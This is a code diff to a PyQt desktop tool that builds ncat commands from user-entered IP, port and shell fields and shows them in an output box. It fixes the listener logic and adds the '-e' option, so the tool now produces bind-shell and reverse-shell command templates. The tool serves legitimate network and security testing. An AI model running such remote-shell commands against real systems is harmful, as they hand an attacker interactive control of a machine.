@@ -1281,17 +1281,23 @@ class Window(QMainWindow):
             ip = ip_input.text()
             port = port_input.text()
             shell = shell_input.text()
-            listener = "-l" if listener_yes.isChecked() else ""
+            listener = listener_yes.isChecked()
 
             if not ip or not port:
                 QMessageBox.warning(dialog, "Input Error", "Please enter both IP address and port.")
                 return ""
+
             if listener:
-                command = f"ncat -l -v -p {port}"
-            if command:
-                command = f"ncat {ip} {port} -e {shell}"
+                if shell:
+                    command = f"ncat -l -v -p {port} -e '{shell}'"
+                else:
+                    command = f"ncat -l -v -p {port}"
             else:
-                command = f"ncat {ip} {port}"
+                if shell:
+                    command = f"ncat {ip} {port} -e '{shell}'"
+                else:
+                    command = f"ncat {ip} {port}"
+
             output_area.setText(command)
             return command
 
